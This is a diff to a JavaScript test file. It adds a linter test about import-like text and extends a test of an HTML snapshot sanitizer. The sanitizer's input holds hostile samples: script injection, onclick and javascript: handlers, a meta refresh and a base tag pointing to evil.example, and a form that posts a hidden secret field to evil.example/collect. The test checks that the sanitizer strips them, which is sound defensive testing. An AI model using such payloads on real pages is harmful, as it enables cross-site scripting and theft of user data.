@@ -110,14 +110,27 @@ test("static checks name the traps of the sandbox before an app runs", () => {
   expect(lintApp({ "app.js": "" })).toEqual([{ severity: "error", kind: "missing", message: "An app needs index.html" }]);
 });
 
+test("import-like text in comments and strings is no import", () => {
+  const issues = lintApp({
+    "index.html": "<main></main>",
+    "app.js": ['// import "./old.js" was removed', "const label = 'Import from \"./data.csv\"';", 'import { total } from "./lib.js";'].join(
+      "\n",
+    ),
+    "lib.js": "export const total = 1;",
+  });
+  expect(issues).toEqual([]);
+});
+
 test("a snapshot keeps the content and styles of an app but runs nothing", () => {
   const html = sanitizeSnapshot(
-    `<!doctype html><html><head><meta http-equiv="refresh" content="0;url=https://evil.example"><script id="cloud-prelude">x()</script><style>p{color:red}</style><base href="https://evil.example/"></head><body><p onclick="steal()">Total 30</p><a href=" javascript:alert(1)">x</a><iframe srcdoc="x"></iframe><img src="data:image/png;base64,AAAA"><a href="data:text/html;base64,PHNjcmlwdD4=">y</a><svg><a href="javascript:x()"><text>t</text></a></svg></body></html>`,
+    `<!doctype html><html><head><meta http-equiv="refresh" content="0;url=https://evil.example"><script id="cloud-prelude">x()</script><style>p{color:red}</style><base href="https://evil.example/"></head><body><p onclick="steal()">Total 30</p><a href=" javascript:alert(1)">x</a><iframe srcdoc="x"></iframe><img src="data:image/png;base64,AAAA"><a href="data:text/html;base64,PHNjcmlwdD4=">y</a><svg><a href="javascript:x()"><text>t</text></a></svg><form action="https://evil.example/collect"><input type="hidden" name="secret" value="s"><button formaction="https://evil.example/other">Send</button></form></body></html>`,
   );
   expect(html).toContain("Total 30");
   expect(html).toContain("p{color:red}");
   expect(html).toContain("data:image/png;base64,AAAA");
-  for (const removed of ["<script", "onclick", "javascript:", "refresh", "<iframe", "<base", "data:text/html"])
+  for (const removed of ["<script", "onclick", "javascript:", "refresh", "<iframe", "<base", "data:text/html", "evil.example"])
     expect(html).not.toContain(removed);
-  expect(html).toContain(`content="default-src 'none'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:"`);
+  expect(html).toContain(
+    `content="default-src 'none'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; form-action 'none'"`,
+  );
 });
